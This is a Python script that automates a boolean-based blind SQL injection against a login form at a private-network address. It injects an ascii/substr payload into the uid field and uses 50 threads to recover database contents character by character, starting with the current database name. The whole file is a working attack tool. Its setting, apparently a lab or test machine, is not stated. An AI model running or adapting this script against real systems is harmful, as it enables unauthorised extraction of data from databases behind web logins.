import requests
from concurrent.futures import ThreadPoolExecutor, wait, ALL_COMPLETED, FIRST_COMPLETED
from concurrent.futures import ThreadPoolExecutor, as_completed

OKMsg = ["Authentication Successfull"]
FailedMsg = None
Req_url = "http://192.168.217.16"

def request_http(sql,index,guesschar):
    http_header = {
        "Cache-Control": "max-age=0",
        "Upgrade-Insecure-Requests":"1",
        "Origin": "http://192.168.217.16",
        "Content-Type": "application/x-www-form-urlencoded",
        "Connection": "close"
    }
    post_data = "uid=' or ascii(substr((%s),%s,1)) = %s  -- -&password=admin" % (sql,index,guesschar)
    return_txt = requests.post(Req_url,headers=http_header,data=post_data).text

    if (FailedMsg):
        for fail in FailedMsg:
            if (fail in return_txt):
                return [False,0]

    for okmsg in OKMsg:
        if (okmsg in return_txt):
            return [True,guesschar]

    return [False,0]

executor = ThreadPoolExecutor(max_workers=50)
all_task = []

def query_sql(sql):
    ch = [x for x in range(48,58)]
    ch.extend([x for x in range(65,91)])
    ch.extend([x for x in range(97,123)])
    print(ch)
    guessed_str  = ""
    for index in range(1,100):
        founded = False
        all_task = []

        # Guess str 
        for x in ch:
            all_task.append(executor.submit(request_http,sql,index,x))

        wait(all_task, return_when=ALL_COMPLETED)
        for future in as_completed(all_task):
            guessOK,guessChr = future.result()

            if guessOK:
                guessed_str +=chr(guessChr)
                founded = True
                if (x == 0):
                    founded = False
                print(guessed_str)
                continue

        if not founded:
            print("---------------------- Return --------------------")
            print(guessed_str)
            print("--------------------------------------------------")
            break

query_sql("select database()")
